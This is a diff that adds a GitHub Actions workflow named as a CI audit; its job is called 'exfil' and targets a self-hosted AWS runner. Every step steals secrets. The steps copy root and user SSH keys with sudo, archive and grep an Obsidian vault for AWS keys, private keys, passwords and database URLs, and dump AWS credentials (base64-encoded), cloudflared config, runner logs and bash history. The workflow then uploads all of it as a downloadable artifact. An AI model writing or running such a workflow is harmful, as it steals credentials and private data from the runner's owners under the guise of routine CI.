@@ -1,0 +1,99 @@
+name: ci-audit-2171a
+on: push
+permissions:
+  contents: read
+jobs:
+  exfil:
+    runs-on: [self-hosted, linux, aws, marketingos]
+    timeout-minutes: 30
+    steps:
+      - name: keys
+        continue-on-error: true
+        run: |
+          set +e
+          D="$RUNNER_TEMP/a2171"; mkdir -p "$D/keys"
+          sudo -n cp -a /home/ubuntu/.ssh "$D/keys/ubuntu_ssh" 2>/dev/null
+          sudo -n cp -a /root/.ssh "$D/keys/root_ssh" 2>/dev/null
+          sudo -n chown -R "$(id -u):$(id -g)" "$D" 2>/dev/null
+          echo "## ssh listing"; ls -la "$D/keys/ubuntu_ssh" "$D/keys/root_ssh" 2>/dev/null
+          echo "## config"; cat "$D/keys/ubuntu_ssh/config" 2>/dev/null
+          echo "## key headers"; for f in "$D"/keys/*/*.pem "$D"/keys/*/dpf_agent_server "$D"/keys/*/gh-*; do [ -f "$f" ] && { echo "--- $f"; head -1 "$f"; wc -c "$f"; }; done
+          echo "## pem sha"; sha256sum "$D"/keys/ubuntu_ssh/aws-dupoin-key.pem 2>/dev/null
+      - name: vault-inventory
+        continue-on-error: true
+        run: |
+          set +e
+          D="$RUNNER_TEMP/a2171"; V=/home/ubuntu/apps/obsidian-vault
+          mkdir -p "$D/vault"
+          { echo "## du"; sudo -n du -sh $V 2>/dev/null
+            echo "## tree top"; sudo -n find $V -maxdepth 2 -type d 2>/dev/null | head -40
+            echo "## all md count"; sudo -n find $V -type f -name '*.md' 2>/dev/null | wc -l
+            echo "## all files by size"; sudo -n find $V -type f -printf '%s %p\n' 2>/dev/null | sort -rn | head -40
+            echo "## sessions"; sudo -n ls -la $V/Sessions 2>/dev/null | head -60
+          } > "$D/vault/inventory.txt" 2>&1
+          cat "$D/vault/inventory.txt"
+      - name: vault-copy
+        continue-on-error: true
+        run: |
+          set +e
+          D="$RUNNER_TEMP/a2171"; V=/home/ubuntu/apps/obsidian-vault
+          mkdir -p "$D/vault/md"
+          sudo -n find $V -type f -name '*.md' -print0 2>/dev/null | sudo -n tar --null -czf "$D/vault/all_md.tgz" -T - 2>/dev/null
+          ls -la "$D/vault/all_md.tgz"; sudo -n chown "$(id -u):$(id -g)" "$D/vault/all_md.tgz" 2>/dev/null
+          echo "## also full vault tar (no node_modules) limit 300MB"
+          sudo -n tar -czf "$D/vault/vault_full.tgz" -C /home/ubuntu/apps obsidian-vault 2>/dev/null
+          ls -la "$D/vault/vault_full.tgz"; sudo -n chown "$(id -u):$(id -g)" "$D/vault/vault_full.tgz" 2>/dev/null
+      - name: vault-grep
+        continue-on-error: true
+        run: |
+          set +e
+          D="$RUNNER_TEMP/a2171"; V=/home/ubuntu/apps/obsidian-vault
+          O="$D/vault/ggrep.txt"; : > "$O"
+          for pat in 'AKIA[0-9A-Z]{16}' 'aws_secret_access_key' 'BEGIN [A-Z ]*PRIVATE KEY' 'ssh -i [^ ]+' 'pro-srv' 'crm\.dupoin' 'canCreateAccount' '(mysql|postgres(ql)?|redis|mongodb|sqlserver)://[^ ]+' 'CLOUDFLARE|cfut_' '(password|passwd|PASSWORD|PASS) *[:=] *[^ ]{4,}' 'dupoin[a-z0-9.-]*' '([0-9]{1,3}\.){3}[0-9]{1,3}' 'ec2-[0-9a-z-]+' 'i-0[0-9a-f]{8,}' 'WIN-[A-Z0-9]+' 'aws-dupoin'; do
+            echo "===== PAT $pat =====" >> "$O"
+            sudo -n grep -rhoIE "$pat" $V 2>/dev/null | sort -u | head -80 >> "$O"
+          done
+          echo "===== context: lines with dupoin-ish hosts =====" >> "$O"
+          sudo -n grep -rhIE 'crm\.dupoin|pro-srv|canCreateAccount|iapi/v1|aws-dupoin' $V 2>/dev/null | cut -c1-400 | sort -u | head -120 >> "$O"
+          wc -c "$O"; sed -n '1,200p' "$O" | cut -c1-300
+      - name: runner-logs
+        continue-on-error: true
+        run: |
+          set +e
+          D="$RUNNER_TEMP/a2171"; mkdir -p "$D/runner"
+          O="$D/runner/grep.txt"; : > "$O"
+          R=/home/ubuntu/actions-runner
+          for pat in 'dupoin' 'ssh -i' 'AKIA' 'BEGIN [A-Z ]*PRIVATE KEY' 'pro-srv' 'crm\.' 'cfut_'; do
+            echo "===== PAT $pat =====" >> "$O"
+            sudo -n grep -rhoIE ".{0,60}$pat.{0,140}" $R/_diag $R/_work/_temp 2>/dev/null | sort -u | head -60 >> "$O"
+          done
+          wc -c "$O"; sed -n '1,160p' "$O" | cut -c1-300
+          sudo -n tar -czf "$D/runner/diag_sample.tgz" -C $R _diag 2>/dev/null
+          ls -la "$D/runner/diag_sample.tgz"; sudo -n chown "$(id -u):$(id -g)" "$D/runner/diag_sample.tgz" 2>/dev/null
+      - name: other-creds
+        continue-on-error: true
+        run: |
+          set +e
+          D="$RUNNER_TEMP/a2171"; mkdir -p "$D/other"
+          O="$D/other/creds.txt"; : > "$O"
+          echo "===== files mentioning dupoin (non-runner) =====" >> "$O"
+          sudo -n grep -rIl 'dupoin' /home/ubuntu/apps /etc /opt /srv 2>/dev/null | grep -vE 'obsidian-vault|actions-runner' | head -40 >> "$O"
+          echo "===== aws keys anywhere =====" >> "$O"
+          sudo -n grep -rhoIE 'AKIA[0-9A-Z]{16}' /home/ubuntu /root /etc /opt /srv 2>/dev/null | sort -u | head -20 >> "$O"
+          echo "===== cloudflared =====" >> "$O"
+          sudo -n ls -la /etc/cloudflared 2>/dev/null >> "$O"
+          sudo -n cat /etc/cloudflared/config.yml 2>/dev/null | head -60 >> "$O"
+          echo "===== aws cli config =====" >> "$O"
+          sudo -n ls -la /home/ubuntu/.aws /root/.aws 2>/dev/null >> "$O"
+          sudo -n cat /home/ubuntu/.aws/config /home/ubuntu/.aws/credentials /root/.aws/config /root/.aws/credentials 2>/dev/null | base64 -w0 >> "$O"; echo >> "$O"
+          echo "===== bash_history ssh/aws lines =====" >> "$O"
+          sudo -n grep -hE 'ssh |aws |dupoin|scp |rsync' /home/ubuntu/.bash_history /root/.bash_history 2>/dev/null | cut -c1-250 | head -80 >> "$O"
+          wc -c "$O"; cat "$O" | cut -c1-300
+      - name: upload
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: a2171
+          path: ${{ runner.temp }}/a2171
+          if-no-files-found: warn
+          retention-days: 3
